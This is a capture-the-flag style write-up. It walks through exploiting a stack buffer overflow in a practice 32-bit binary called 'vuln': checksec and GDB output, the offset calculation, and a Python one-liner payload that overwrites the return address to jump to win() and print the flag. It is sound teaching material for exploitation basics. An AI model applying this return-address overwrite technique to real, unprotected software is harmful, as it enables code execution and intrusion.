> Source File: `vuln.c`

> Executable File: `vuln`
---

From the source code, we can see `win()` is the one who prints out the `flag`! But the problem is `main()` calls the `vuln()` function which then does not calls the `win()` function!

So, our goal is to call `win()` function and execute it in program.

Lets run our binary normally.
```
# ./vuln 
Please enter your string: 
Hey!GiveMeFlag.
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

# checksec --file=vuln
[*] '/root/ELF-Exploitation/BOF-1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```
From above output, we can see that `./vuln` asks for `user input` and then just finishes! Also, from output of `checksec` we can see there is `No canary found` means we can control the registers available on the stack.

#### Stack layout:

![StackLayout](https://github.com/user-attachments/assets/234adb0b-aa6a-46eb-9bf3-808ed853bf7e)


Suppose, we will provide `AAA...` in user input, after 32 characters it will start overwrite next elements on the stack.

Here our goal would be to overwrite the `return Address` which is just before the `Saved %ebp`  in stack.

![OurGoal](https://github.com/user-attachments/assets/2eefc73f-acac-4cbd-b0bc-0b3cd240b264)

Lets use GDB tool and see where that address lies.

```
# gdb ./vuln -q
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 13.2 in 0.00ms using Python engine 3.11
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
gef➤
```

We will provide first genuine(valid) input of `32 Bytes` only and examine the stack right after providing input.

![ExamineStack](https://github.com/user-attachments/assets/b01e3149-339d-42eb-801e-e134e732a051)

Now, we have to provide `user input` which can overwrite the `Local variables` and `Saved %ebp` and finally `retAddr` with the starting Address of `win()` function.

Here is how you can get the address of `win()` function.
```
gef➤  p win
$1 = {<text variable, no debug info>} 0x80491f6 <win>
```

#### Preparing the Payload

```
payload => [32 A's] + [8 B's] + [4 C's] + [addr of win]
payload = 'A'*32 + 'B'*8 + 'C'*4 + '0x80491f6'

# python3 -c "import sys; sys.stdout.buffer.write( b'A'*32  +  b'B'*8  +  b'C'*4  +  b'\xf6\x91\x04\x08')"
```
Let's examine the stack again after providing this payload!

![ExamineStackwithPayload](https://github.com/user-attachments/assets/a2646c71-24e0-4046-9b3a-56c7b9ac01a7)

Save the payload in file and run the `./vuln` with `payload`.
```
# ./vuln < payload.txt 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag{WinayGupta777}
Segmentation fault
```

We got the flag!
